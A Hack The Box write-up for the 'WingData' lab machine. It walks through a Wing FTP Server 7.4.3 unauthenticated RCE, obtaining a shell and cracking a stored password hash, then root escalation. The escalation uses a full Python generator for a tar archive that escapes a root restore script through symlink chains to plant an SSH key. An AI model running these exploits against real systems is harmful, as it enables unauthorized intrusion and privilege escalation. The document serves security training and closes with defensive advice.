---
title: WingData
description: WingData Hack The Box writeup covering Wing FTP RCE and a tarfile path-filter bypass to root.
---

# WingData

<img class="htb-banner" src="images/banner.png" alt="WingData box banner placeholder">

!!! note "Replaceable banner"
    Replace `images/banner.png` in this box folder with the final WingData artwork. The page already points to that filename.

| Field | Value |
| --- | --- |
| Status | Completed — May 8, 2026 |
| Difficulty | Easy; assessed as Medium by the author |
| Focus | Linux, web exploitation |
| Machine | [WingData on Hack The Box](https://app.hackthebox.com/machines/WingData?sort_by=created_at&sort_type=desc) |

## Attack path

1. Enumerate HTTP and SSH and identify the Wing FTP Server installation behind the virtual host.
2. Use the unauthenticated Wing FTP Server 7.4.3 RCE to execute commands as `wingftp`.
3. Obtain a shell and inspect the Wing FTP user database.
4. Crack a stored password hash and use the resulting access to inspect the backup service.
5. Build a malicious tar archive that abuses Python's path-filter weakness to write root's `authorized_keys`.
6. Restore the archive through the permitted backup script and SSH as root.

## 1. Reconnaissance

The scan exposed HTTP and SSH:

```bash
nmap -p- --min-rate 1000 -T4 -A -sV -Pn -oA nmap_full_scan LAB_IP
```

| Port | Service | Observation |
| ---: | --- | --- |
| 22/tcp | SSH | OpenSSH 9.2p1 on Debian. |
| 80/tcp | HTTP | Apache redirects to `wingdata.htb`. |

The two supplied screenshots show the web reconnaissance sequence.

<figure class="htb-figure">
  <img class="htb-screenshot" src="images/image-1.png" alt="WingData web reconnaissance screenshot one" loading="lazy">
  <figcaption><strong>Figure 1.</strong> The first WingData reconnaissance view.</figcaption>
</figure>

<figure class="htb-figure">
  <img class="htb-screenshot" src="images/image-2.png" alt="WingData web reconnaissance screenshot two" loading="lazy">
  <figcaption><strong>Figure 2.</strong> The second reconnaissance view used to identify the Wing FTP surface.</figcaption>
</figure>

## 2. Identify the Wing FTP Server RCE

Search Exploit-DB locally for the detected Wing FTP version:

```bash
searchsploit "Wing FTP Server 7.4.3"
searchsploit -m multiple/remote/52347.py
```

The matching entry is an unauthenticated remote-code-execution exploit associated with CVE-2025-47812. Test command execution against the virtual host:

```bash
python3 52347.py \
  -u http://ftp.wingdata.htb/ \
  -c "id"
```

The completed run returned:

```text
uid=1000(wingftp) gid=1000(wingftp) groups=1000(wingftp),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)
```

This confirms unauthenticated command execution as the service account.

## 3. Get an interactive shell

Start a listener and use the exploit to obtain a callback:

```bash
nc -lvnp 4444
```

After the callback, stabilize the shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

The resulting shell runs as `wingftp` in the Wing FTP installation directory:

```text
wingftp@wingdata:/opt/wftpserver$
```

The source notes contain a large LinPEAS capture. Instead of repeating thousands of lines of tool output, the relevant findings are carried into the next steps: Wing FTP user data is readable, and the backup/restore workflow is available for the later root path.

## 4. Recover a usable account and inspect the backup path

Inspect the Wing FTP user XML files for stored password hashes:

```bash
for f in /opt/wftpserver/Data/1/users/*.xml; do
  echo "=== $f ==="
  grep -E "UserName|Password" "$f"
done
```

The source notes recovered the following hash during the completed session:

```text
32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP:pyth
```

Crack the hash with the available wordlist:

```bash
hashcat -m 1410 hash.txt /usr/share/wordlists/rockyou.txt
```

The recovered password was `pyth`. Continue by checking the backup service and its permitted restore directory. The important question is not only whether a backup can be uploaded, but where the restore process writes archive members and which user executes it.

## 5. Build the malicious archive

The completed solution abuses a Python `tarfile` path-filter weakness. The archive uses a long chain of directories and symlinks to escape the intended backup directory, then writes a file at `/root/.ssh/authorized_keys`.

The following compact generator preserves the important stages from the source exploit:

```python
#!/usr/bin/env python3
import argparse
import io
import os
import tarfile

DIR_COMP_LEN = 247
CHAIN_STEPS = "abcdefghijklmnop"
LONG_LINK_LEN = 254


def build_exploit_tar(output, target_file, public_key):
    component = "d" * DIR_COMP_LEN
    inner = ""

    with tarfile.open(output, "w") as tar:
        # Build long directory/symlink pairs.
        for step in CHAIN_STEPS:
            directory = tarfile.TarInfo(os.path.join(inner, component))
            directory.type = tarfile.DIRTYPE
            tar.addfile(directory)

            link = tarfile.TarInfo(os.path.join(inner, step))
            link.type = tarfile.SYMTYPE
            link.linkname = component
            tar.addfile(link)
            inner = os.path.join(inner, component)

        # Add the long pivot link and an escape link to the target directory.
        short_chain = "/".join(CHAIN_STEPS)
        pivot_name = os.path.join(short_chain, "l" * LONG_LINK_LEN)
        pivot = tarfile.TarInfo(pivot_name)
        pivot.type = tarfile.SYMTYPE
        pivot.linkname = "../" * len(CHAIN_STEPS)
        tar.addfile(pivot)

        escape = tarfile.TarInfo("escape")
        escape.type = tarfile.SYMTYPE
        escape.linkname = pivot_name + "/" + ("../" * 8) + target_file.lstrip("/")
        tar.addfile(escape)

        payload = public_key.encode() + b"\n"
        entry = tarfile.TarInfo("escape/authorized_keys")
        entry.size = len(payload)
        entry.mode = 0o600
        entry.uid = 0
        entry.gid = 0
        tar.addfile(entry, io.BytesIO(payload))


parser = argparse.ArgumentParser()
parser.add_argument("--tar-out", required=True)
parser.add_argument("--payload", required=True)
args = parser.parse_args()

with open(args.payload, "r", encoding="utf-8") as key_file:
    public_key = key_file.read().strip()

build_exploit_tar(args.tar_out, "/root/.ssh/authorized_keys", public_key)
```

Generate a key pair and create the archive:

```bash
ssh-keygen -t ed25519 -f ~/.ssh/wingdata_key -N ""

python3 exploit.py \
  --payload ~/.ssh/wingdata_key.pub \
  --tar-out backup_888.tar
```

Move the archive into the permitted backup directory, then invoke the restore script:

```bash
mv backup_888.tar /opt/backup_clients/backups/
cd /opt/backup_clients/backups/

sudo /usr/local/bin/python3 \
  /opt/backup_clients/restore_backup_clients.py \
  -b backup_888.tar \
  -r restore_win123
```

## 6. Log in as root

Use the private key corresponding to the public key written by the archive:

```bash
ssh -i ~/.ssh/wingdata_key root@127.0.0.1

root@wingdata:~# whoami
root

root@wingdata:~# cat /root/root.txt
<ROOT_FLAG_REDACTED>
```

## Why the archive works

The backup restore process extracts attacker-controlled tar members while trusting a path that crosses a chain of symlinks. Long path components and a pivot link bypass the intended path boundary, allowing the final file write to escape the backup directory. Because the restored file is written as root, the archive can inject an SSH public key into root's `authorized_keys`.

## Defensive notes

- Extract archives into a dedicated directory and validate every member after canonicalizing its path.
- Reject absolute paths, `..` traversal and symlink/hardlink members in untrusted archives.
- Run restore helpers as a dedicated unprivileged account wherever possible.
- Restrict backup directories and never combine writable upload paths with a root restore process.
